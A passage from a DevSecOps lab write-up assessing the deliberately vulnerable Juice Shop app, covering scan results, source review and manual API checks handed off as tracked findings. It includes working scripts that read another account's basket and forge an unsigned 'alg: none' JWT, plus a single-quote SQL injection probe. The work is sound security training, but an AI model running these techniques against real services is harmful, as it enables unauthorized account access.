I then inspected selected responses and kept tool evidence separate from manual evidence. A route returning `200` is not automatically a vulnerability: the response data and intended access policy matter.

Once the port-3001 tunnel returned HTTP 200, I checked selected API responses from **WSL**. I used read-only GET requests to compare status codes, headers, and response fields with ZAP's observations:

```bash
BASE='http://localhost:3001'
curl -sS -i --max-time 10 "$BASE/api/Quantitys/"
curl -sS -i --max-time 10 "$BASE/rest/admin/application-configuration"
curl -sS -i --max-time 10 "$BASE/rest/admin/application-version"
curl -sS -i --max-time 10 "$BASE/rest/continue-code"
curl -sS -i --max-time 10 "$BASE/rest/languages"
curl -sS -i --max-time 10 "$BASE/rest/products/search?q=apple"
curl -sS -i --max-time 10 "$BASE/rest/user/whoami"
curl -sS -i --max-time 10 "$BASE/api/Users"
curl -sS -i --max-time 10 --get --data-urlencode 'name=Score Board' "$BASE/api/Challenges/"
curl -sS -D - -o /dev/null --max-time 10 \
  -H 'Origin: https://other-origin.example' "$BASE/api/Quantitys/"
```

I recorded HTTP status, selected response headers, and the body where available. I reviewed the application-configuration response for the disclosed IP/timestamp values and common secret-like property names; no secret was confirmed. `/api/Users` returned `401` anonymously. These requests do not change application state.

I also tried a normal search and a single-quote search during one unstable tunnel period. Both timed out, so I excluded those attempts from the injection evidence. The separate ZAP API Scan later produced the HTTP 500 alert on the quote-containing search, and the source review showed the unsafe SQL construction:

```bash
# WSL terminal; these were response checks, not data-extraction attempts.
BASE='http://localhost:3001'
curl -sS -i --max-time 10 --get --data-urlencode 'q=apple' \
  "$BASE/rest/products/search"
curl -sS -i --max-time 10 --get --data-urlencode "q='" \
  "$BASE/rest/products/search"
```

For example, the public `/api/Quantitys/` endpoint returned 56 inventory records with exact quantities and per-user purchase limits. This was recorded as a potential business-data exposure for an owner to assess, because the evidence did not define whether the lab intended those values to be public. The anonymous `/api/Users` request returned `401`, which was positive evidence that anonymous access was denied on that route.

### 5.2 I tested cross-account basket authorization

The automated API scan was unauthenticated, so it could not establish cross-account object authorization. Before sending a live request, I examined the basket route and its tests in the source checkout. The saved source output showed `GET /rest/basket/:id`, a basket lookup by the requested ID, and tests for cross-user access and forged JWTs. I use these commands to revisit those lines from the **WSL terminal**; the exact original source-search command was not retained:

```bash
cd ~/project-2a/juice-shop-source
grep -n -C 4 "app.get('/rest/basket/:id'" server.ts
sed -n '1,70p' routes/basket.ts
sed -n '40,125p' test/api/basket.test.ts
```

Source review gave me a test hypothesis, but I still needed a live response from the running container. My first login script through the WSL tunnel reached a socket but timed out waiting for a response. I moved this check to the **target VM**, where the container bridge had already returned HTTP 200. I used Account A and Account B, recorded each account's own basket ID, then issued read-only requests for the other account's basket. The output showed HTTP 200 in both directions and returned the other account's basket ID. This confirmed a lab Broken Object Level Authorization (BOLA) issue, recorded as **API-01** and linked to GitHub Issue #1.

The test demonstrated cross-account basket access. It did not inspect basket contents or attempt a state-changing operation, so the evidence is limited to the unauthorized object reference/read behavior observed.

Before running the account script on the **target VM**, I confirmed the existing container and its bridge address. The initial version of my script used `input()` for an email while its code was supplied through a heredoc; that returned `EOFError` because standard input was already feeding the script. I switched both prompts to `getpass.getpass()`, which reads from the terminal. The code below reconstructs the successful read-only sequence from the preserved outputs; the original full script was not saved. I use only the two accounts created for this lab:

```bash
sudo docker ps --filter name=juice-shop
CONTAINER_IP="$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' juice-shop)"
BASE="http://$CONTAINER_IP:3000"
curl -sS -o /dev/null -w 'Target bridge HTTP %{http_code}\n' \
  --max-time 5 "$BASE/"

login_account() {
  python3 - "$BASE" "$1" <<'PY'
import getpass
import json
import sys
import urllib.request

base, label = sys.argv[1], sys.argv[2]
email = getpass.getpass(f'Account {label} test email (hidden): ')
password = getpass.getpass(f'Account {label} password (hidden): ')
payload = json.dumps({'email': email, 'password': password}).encode()
request = urllib.request.Request(
    base + '/rest/user/login',
    data=payload,
    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
)
with urllib.request.urlopen(request, timeout=10) as response:
    result = json.load(response)
auth = result['authentication']
print(str(auth['token']) + '|' + str(auth['bid']))
PY
}

RESULT_A="$(login_account A)" || exit 1
TOKEN_A="${RESULT_A%%|*}"
BASKET_A="${RESULT_A#*|}"
RESULT_B="$(login_account B)" || exit 1
TOKEN_B="${RESULT_B%%|*}"
BASKET_B="${RESULT_B#*|}"

# I printed only HTTP status and the returned basket ID, not response contents.
export BASE TOKEN_A TOKEN_B BASKET_A BASKET_B
python3 - <<'PY'
import json
import os
import urllib.request

base = os.environ['BASE']
a, b = os.environ['BASKET_A'], os.environ['BASKET_B']
ta, tb = os.environ['TOKEN_A'], os.environ['TOKEN_B']
cases = [('A own', ta, a), ('B own', tb, b),
         ('A reads B', ta, b), ('B reads A', tb, a)]
for label, token, basket_id in cases:
    req = urllib.request.Request(
        f'{base}/rest/basket/{basket_id}',
        headers={'Authorization': f'Bearer {token}', 'Accept': 'application/json'},
    )
    with urllib.request.urlopen(req, timeout=10) as response:
        payload = json.load(response)
        returned_id = payload.get('data', {}).get('id')
        print(f'{label}: HTTP {response.status}; returned basket ID={returned_id}')
PY
```

The preserved terminal result was:

```text
Account A reading its own basket: HTTP 200; returned basket ID=6
Account B reading its own basket: HTTP 200; returned basket ID=7
Account A reading Account B's basket: HTTP 200; returned basket ID=7
Account B reading Account A's basket: HTTP 200; returned basket ID=6
```

I did not print bearer tokens or basket contents. This manual result answered an access-control question that the unauthenticated ZAP run did not cover.

### 5.3 I checked whether an unsigned JWT was accepted

I used a test account and sent a read-only basket request with an unsigned JWT (`alg: none`). The service returned HTTP 200 and a basket ID. This confirmed that the lab accepted an unsigned token for that protected read, recorded as **API-02** and linked to GitHub Issue #2. The broader consequences, such as using the token to impersonate other users or perform writes, were not tested.

I used the same Account A session for the token check on the **target VM**. The reconstructed command changes only the JWT header to `alg: none`, removes the signature, and sends a read-only basket request. The account token stays in a shell variable and is not saved in the repository:

```bash
export TOKEN_A
TOKEN_NONE="$(python3 - <<'PY'
import base64, json, os

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

parts = os.environ.get('TOKEN_A', '').split('.')
if len(parts) != 3:
    raise SystemExit('Expected a three-part JWT')
header = b64url(json.dumps({'alg': 'none', 'typ': 'JWT'}, separators=(',', ':')).encode())
print(header + '.' + parts[1] + '.')
PY
)"
export BASE TOKEN_NONE BASKET_A
python3 - <<'PY'
import json
import os
import urllib.request

req = urllib.request.Request(
    f"{os.environ['BASE']}/rest/basket/{os.environ['BASKET_A']}",
    headers={'Authorization': f"Bearer {os.environ['TOKEN_NONE']}"},
)
with urllib.request.urlopen(req, timeout=10) as response:
    payload = json.load(response)
    print('Unsigned token: HTTP', response.status,
          '; returned basket ID=', payload.get('data', {}).get('id'))
PY
unset TOKEN_A TOKEN_B TOKEN_NONE RESULT_A RESULT_B BASKET_A BASKET_B BASE
```

The preserved terminal result was `Unsigned-token request: HTTP 200; returned basket ID=6`. I did not modify data.

**Safety and evidence note:** The purpose was to demonstrate authentication validation in the training app. I did not test real accounts or a production service, and I did not use the test to modify basket state.

### 5.4 I combined manual and tool results without treating them as duplicates

I kept the source of each result clear. My two-account BOLA and unsigned-JWT checks were manual; ZAP's unauthenticated API scan did not reproduce them. ZAP raised the product-search SQL alert, and I used source review to confirm unsafe query construction. For CORS and configuration behavior, I compared ZAP's repeated observations with my manual response checks rather than counting the same behavior twice.

The API appendix and consolidated assessment distinguish:

- **API-01:** confirmed cross-account basket read (manual, two accounts).
- **API-02:** unsigned JWT accepted on a protected basket read (manual).
- **API-03:** unsafe product-search SQL construction (ZAP signal plus source confirmation; runtime exploit effect not demonstrated).
- **API-04:** wildcard CORS policy observed; sensitive credentialed cross-origin access not demonstrated.
- **API-05:** configuration IP/timestamp metadata observed; no secret confirmed and sensitivity depends on owner context.
- **API-06:** malformed-request server errors observed by ZAP; no sensitive response body confirmed.
- **API-07/API-08:** content-type and CSP observations recorded as lower-confidence or lower-impact follow-up items.

## 6. Assessment handoff

### 6.1 I wrote findings for the teams who own remediation

My role in this lab was assessment and risk communication. The developers own source changes. The service owner supplies business context, assigns an accountable team, sets target dates, and decides whether any residual risk is accepted. DevSecOps makes the work actionable by preserving evidence, deduplicating results, explaining confidence, connecting findings to risk, and defining how a fix should be verified.

The repository contains the consolidated assessment report, SCA/SAST/DAST/API appendices, risk register, detailed SCA/SAST CSV, and first-pass triage. Six API remediation issues were created in GitHub Issues #1–#6. They link back to evidence and provide proposed acceptance and verification expectations. An issue is a handoff; it is not proof that a developer has fixed the problem.

### 6.2 I kept remediation and verification as future work

This lab stage stops after documenting and assigning follow-up. No Juice Shop source fixes were made. In a real delivery pipeline, the development team would implement changes, and DevSecOps would help define focused regression tests, rerun the relevant scanner or manual check against the fixed build, capture the result, and update the assessment and risk register. A service owner would close or accept the risk based on evidence and business context.

## What I learned

- A scan cannot begin until the right code, dependencies, target, and network path are available. `HTTP 000` and missing `node_modules` are setup failures, not security results.
- SCA needs dependency paths and build context; SAST needs source/path review; DAST needs a reachable running target; API authorization checks need authenticated identities and object-level test cases.
- Automation gives breadth and repeatability. Manual checks answer focused questions that an unauthenticated scanner cannot answer. Their evidence should be combined with provenance preserved.
- Juice Shop is deliberately vulnerable, so the lab shows how to assess and communicate issues rather than how to claim production risk without context.
- Finding a defect is one stage of DevSecOps. The process becomes useful when the evidence reaches the right engineering owner with a clear fix outcome and a way to verify it.

## Related Project 2A SCA, SAST and DAST Scanning records

- [Consolidated assessment report](assessment-report-inventory.md)
- [First-pass triage](triage-review.md)
- [Risk register](risk-register.md)
- [Detailed SCA/SAST register](risk-register-sca-sast.csv)
- [SCA individual findings](sca-individual-findings.md)
- [SAST individual findings](sast-individual-findings.md)
- [DAST individual findings](dast-individual-findings.md)
- [Manual API findings](manual-api-findings.md)

